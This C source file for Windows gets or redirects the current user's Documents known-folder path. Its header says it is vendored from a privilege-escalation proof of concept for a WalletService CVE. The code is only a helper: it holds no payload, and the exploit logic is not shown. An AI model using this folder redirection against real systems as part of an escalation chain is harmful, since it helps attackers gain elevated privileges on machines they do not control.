/* Vendored from the CVE-2026-49176 WalletService PoC (see lpe/src/README.md).
   Local change: the UNICODE defines are guarded, because -municode already
   defines them on the command line.  Everything else is upstream. */

#ifndef UNICODE
#define UNICODE
#endif
#ifndef _UNICODE
#define _UNICODE
#endif
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shlobj.h>
#include <stdio.h>
#include <wchar.h>

static int get_documents(void)
{
    PWSTR path = NULL;
    HRESULT result = SHGetKnownFolderPath(&FOLDERID_Documents, 0, NULL, &path);
    if (FAILED(result) || !path) {
        fwprintf(stderr, L"SHGetKnownFolderPath failed: 0x%08lx\n",
                 (unsigned long)result);
        return 1;
    }
    wprintf(L"%ls\n", path);
    CoTaskMemFree(path);
    return 0;
}

int wmain(int argc, wchar_t **argv)
{
    HRESULT initialized = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    int result = 2;
    if (argc == 2 && wcscmp(argv[1], L"get") == 0) {
        result = get_documents();
    } else if (argc == 3 && wcscmp(argv[1], L"set") == 0) {
        HRESULT error = SHSetKnownFolderPath(&FOLDERID_Documents, 0, NULL, argv[2]);
        if (FAILED(error)) {
            fwprintf(stderr, L"SHSetKnownFolderPath failed: 0x%08lx\n",
                     (unsigned long)error);
            result = 1;
        } else {
            result = get_documents();
        }
    } else {
        fwprintf(stderr, L"usage: %ls get | set DIRECTORY\n", argv[0]);
    }
    if (SUCCEEDED(initialized)) CoUninitialize();
    return result;
}
